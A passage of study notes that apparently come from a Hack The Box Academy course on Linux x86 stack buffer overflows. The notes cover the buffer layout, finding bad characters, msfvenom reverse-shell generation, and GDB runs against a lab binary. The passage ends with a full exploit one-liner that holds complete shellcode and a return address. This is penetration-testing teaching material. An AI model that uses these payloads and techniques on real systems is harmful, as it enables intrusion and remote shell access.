3. `150 bytes` for our `shellcode`.

  Shellcode - Length

```shell-session
   Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
     NOPs = "\x90" * 100
Shellcode = "\x44" * 150
      EIP = "\x66" * 4
```
Now we can try to find out how much space we have available to insert our shellcode.

#### GDB

  GDB

```shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

#### Buffer

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_7.png)


# Identifying Bad Characters

in unix OSs, binaries started with two-bytes containing a "magic number" that determines file type. In the beginning this was used to identify object files for different platforms. Gradually this concpet was transferred to other files, and now almost every files contains a magic number

such reserved characters also exit in applications, but they do not always occur and are not still the same. These reserved charvters, also known as bad characters can vary, but often we will see them as so:
- \\x00 - Null Byte
- \\x0A - Line Feed
- \\x0D - Carriage return
- \\xFF - Form Feed

Here we use the following character list to find out all characters we have to consider and to avoid when generating our shellcode.
0x551
#### Character List

  Character List

```shell-session
gdxqpardo@htb[/htb]$ CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

We already got to know the tool `msfvenom` with which we generated our shellcode's approximate length. Now we can use this tool again to generate the actual shellcode, which makes the CPU of our target system execute the command we want to have.

But before we generate our shellcode, we have to make sure that the individual components and properties match the target system. Therefore we have to pay attention to the following areas:

- `Architecture`
- `Platform`
- `Bad Characters`

#### MSFvenom Syntax

  MSFvenom Syntax

```shell-session
gdxqpardo@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
```

#### MSFvenom - Generate Shellcode

  MSFvenom - Generate Shellcode

```shell-session
gdxqpardo@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
Saved as: shellcode
```

#### Shellcode

  Shellcode

```shell-session
gdxqpardo@htb[/htb]$ cat shellcode

unsigned char buf[] = 
"\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41"
"\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"
<SNIP>
```

Now that we have our shellcode, we adjust it to have only one string, and then we can adapt and submit our simple exploit again.

#### Notes

  Notes

```shell-session
   Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817
     NOPs = "\x90" * 124
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4'
```

#### Exploit with Shellcode

  Exploit with Shellcode

```shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

Breakpoint 1, 0x56555551 in bowfunc ()
```

Next, we check if the first bytes of our shellcode match the bytes after the NOPS.

#### The Stack

```shell-session
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd64c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd654:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd65c:	0x90	0x90	0xda	0xca	0xba	0xe4	0x11	0xd4
						 # |----> Shellcode begins
<SNIP>
```



```
$(python -c ‘print(“\x55” * (2064–124–95–4) + “\x90” * 124 + "\xdb\xd3\xd9\x74\x24\xf4\xb8\x97\xac\x21\xcc\x5a\x29\xc9\xb1\x12\x31\x42\x17\x03\x42\x17\x83\x55\xa8\xc3\x39\x68\x6a\xf4\x21\xd9\xcf\xa8\xcf\xdf\x46\xaf\xa0\xb9\x95\xb0\x52\x1c\x96\x8e\x99\x1e\x9f\x89\xd8\x76\x2a\x60\x15\x36\x42\x76\x29\x27\xcf\xff\xc8\xf7\x89\xaf\x5b\xa4\xe6\x53\xd5\xab\xc4\xd4\xb7\x43\xb9\xfb\x44\xfb\x2d\x2b\x84\x99\xc4\xba\x39\x0f\x44\x34\x5c\x1f\x61\x8b\x1f" + “**\x2e\xd7\xff\xff**”)'
```

























